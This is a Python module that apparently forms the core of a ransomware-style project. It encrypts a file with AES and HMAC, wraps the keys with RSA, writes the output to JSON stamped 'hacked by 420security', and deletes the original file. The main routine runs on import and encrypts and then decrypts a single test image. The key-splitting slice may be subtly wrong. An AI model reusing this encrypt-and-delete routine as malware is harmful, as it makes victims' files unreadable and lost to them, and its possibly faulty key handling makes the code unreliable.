from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes, hmac
import os
import json
import constants
import AES_Encrypt as a
from base64 import b64encode, b64decode


def GenerateRSAKeys():
    """
    Generates private and public RSA keys
    """
    exp = constants.RSA_EXPONENT
    key_len = constants.RSA_KEYSIZE
    private_key = rsa.generate_private_key(exp,key_len, backend = default_backend())
    public_key = private_key.public_key()

    WritePrivateKey(constants.RSA_PRIVATE_KEY_PATH, private_key)
    WritePublicKey(constants.RSA_PUBLIC_KEY_PATH, public_key)



def WritePrivateKey(filepath,key):
    """
    Writes private key to constant filepath
    INPUT:  filepath - (str) string of filepath from constants
            key - (rsa) data of private key
    """
    private_key = key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption())
    file = open(constants.RSA_PRIVATE_KEY_PATH ,'wb')
    file.write(private_key)
    file.close()
    


def WritePublicKey(filepath, key):
    """
    Writes public key to constant filepath
    INPUT:  filepath - (str) string of filepath from constants
            key - (rsa) data of public key
    """
    public_key = key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo)
    
    file = open(constants.RSA_PUBLIC_KEY_PATH ,'wb')
    file.write(public_key)
    file.close()
            


def LoadRSAPrivateKey(filepath):
    """
    Loads data from filepath and returns private key
    INPUT:  filepath - (str) path to private key from constants
    OUTPUT: private_key - (rsa) data of private key
    """
    with open(filepath,"rb") as file:
        private_key = serialization.load_pem_private_key(
            file.read(),
            password = None,
            backend = default_backend()
        )
    return private_key


def LoadRSAPublicKey(filepath):
    """
    Loads data from filepath and returns public key
    INPUT:  filepath - (str) path to private key from constants
    OUTPUT: private_key - (rsa) data of public key
    """
    with open(filepath,"rb") as file:
        public_key = serialization.load_pem_public_key(
            file.read(),
            backend = default_backend())
    return public_key


def check_keys():
    """
    Checks if private and public RSA keys are both in constant file path directory
    If not, generates both keys
    """
    if (not os.path.isfile(constants.RSA_PRIVATE_KEY_PATH)) or (not os.path.isfile(constants.RSA_PUBLIC_KEY_PATH)):
        GenerateRSAKeys()

    return
        
    


def MyRSAFileEncrypt(filepath):
    """
    Encrypts a file utilizing RSA public key encryption for the keys in RSACipher.
    Creates a json file contaning (RSACipher, C, IV, tag, ext, filepath).
    Deletes original file.
    INPUT:  filepath - (str) path to file to be encrypted
    OUTPUT: RSACipher - (byte str) concatenation of EncKey + HMACKey
            C - (bytes) ciphertext
            IV - (bytes) initialization vector
            tag - (bytes) tag bits
            ext - (str) extension of file
    """
    check_keys()    # generates keys if they are not present in specified directory
    C, IV, tag, EncKey, HMACKey, ext = a.MyFileEncrypt(filepath)
    public_key = LoadRSAPublicKey(constants.RSA_PUBLIC_KEY_PATH)
    key = EncKey + HMACKey
    RSACipher = public_key.encrypt(
        key,
        padding.OAEP(
            mgf = padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    writeToJSON(RSACipher, C, IV, tag, ext, filepath)   # creates json file with encrypted data
    os.remove(filepath) # removes original file

    return RSACipher, C, IV, tag, ext


def MyRSAFileDecrypt(filepath):
    """  
    Decrypts a file from specified filepath.
    Reads values of RSACipher, C, IV, tag, ext from json file.
    Deletes json file and replaces with original decrypted file
    INPUT:  filepath - (str) path to json file with data
    OUTPUT: plaintext - (bytes) decrypted message

    """
    RSACipher, C, IV, tag, ext = readFromJSON(filepath) # getting values with file name

    private_key = LoadRSAPrivateKey(constants.RSA_PRIVATE_KEY_PATH)
    keys = private_key.decrypt(
        RSACipher,
        padding.OAEP(
            mgf= padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    EncKey = keys[:constants.KEY_LEN]   
    HMACKey = keys[constants.HMAC_KEY_LEN:]

    plaintext = a.MyFileDecrypt(filepath, C, IV, tag, EncKey, HMACKey, ext)
    makeFile(plaintext, filepath, ext)  # creates original decrypted file
    os.remove(filepath)     # removes json file with encrypted data

    return plaintext


def writeToJSON(RSACipher, C, IV, tag, ext, filepath):
    """
    Writes values to a json file
    INPUT: RSACipher, C, IV, tag, fileName, ext
    """
    data = {}

    data["signature"] = "hacked by 420security"
    data["RSACipher"] = b64encode(RSACipher).decode("utf-8")
    data["C"] = b64encode(C).decode("utf-8")
    data["IV"] = b64encode(IV).decode("utf-8")
    data["tag"] = b64encode(tag).decode("utf-8")
    data["ext"] = ext

    newPath = filepath.split(".")
    newPath.pop()
    newPath = ".".join(newPath) + ".json"

    with open(newPath, "w") as json_file:
        json.dump(data, json_file)

    json_file.close()


def readFromJSON(filepath):
    """
    Returns values stored in a json file
    INPUT:  filepath - (str) path to json of file
    OUTPUT:  (RSACipher, C, IV, tag, ext)

    """
    with open(filepath) as json_file:  
        data = json.load(json_file)

    RSACipher = b64decode(data["RSACipher"])
    C = b64decode(data["C"])
    IV = b64decode(data["IV"])
    tag = b64decode(data["tag"])
    ext = data["ext"] 

    return RSACipher, C, IV, tag, ext


def makeFile(m, filepath, ext):
    """
    Creates a file given the decrypted plaintext m
    INPUT:  m - (bytes) plaintext
            fileName -  (str) name of file with extension 
    """
    newPath = filepath.split(".")
    newPath.pop()
    newPath = ".".join(newPath) + "." + ext

    out_file = open(newPath, "wb") # writing decrypted message to file
    out_file.write(m)
    out_file.close()
    


def main():

    
    # filepath = "test-files/test.txt"
    # newpath = "test-files/test.json"
    filepath = "test-files/happy.jpg"
    newpath = "test-files/happy.json"

    MyRSAFileEncrypt(filepath)
    MyRSAFileDecrypt(newpath)
    


main()


